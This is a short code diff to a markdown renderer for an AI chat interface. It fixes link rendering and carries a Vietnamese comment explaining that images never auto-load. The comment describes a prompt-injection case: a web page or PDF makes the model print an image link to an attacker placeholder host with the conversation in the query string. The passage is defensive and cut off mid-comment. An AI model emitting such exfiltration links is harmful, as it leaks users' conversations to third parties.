@@ -110,8 +110,8 @@ function buildComponents(ctx: CitationContext): Components {
       // mdast→hast appends one "\n" to every code block's text.
       return <FencedCode code={hastText(code).replace(/\n$/, "")} language={codeLanguage(code)} />;
     },
-    a: ({ node: _node, ...props }) =>
-      renderCitation(props.href ?? "", ctx) ?? <a {...props} target="_blank" rel="noopener noreferrer" />,
+    a: ({ node: _node, children, ...props }) =>
+      renderCitation(props.href ?? "", ctx) ?? <a {...props} target="_blank" rel="noopener noreferrer">{children}</a>,
     // Ảnh KHÔNG bao giờ tự tải. Prompt injection trong trang web (Research)
     // hay PDF có thể bảo model in ra ![](https://kẻ-gian/?d=<hội thoại>) —
     // một <img> sẽ gửi dữ liệu đi ngay lúc câu trả lời hiện ra, không cần ai
